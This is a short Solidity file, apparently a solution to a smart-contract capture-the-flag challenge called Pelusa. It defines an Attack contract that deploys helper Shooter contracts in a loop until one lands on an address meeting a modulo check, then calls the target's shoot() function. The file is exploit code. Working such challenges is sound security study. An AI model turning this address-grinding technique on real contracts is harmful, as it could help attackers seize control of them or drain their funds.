// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./Shooter.sol";

contract Attack
{
    function attack(address target, address real_owner) external
    {
        address last_created;
        while (uint160(last_created) % 100 != 10)
        {
            last_created = address(new Shooter(target, real_owner));
        }

        Pelusa(target).shoot();
    }
}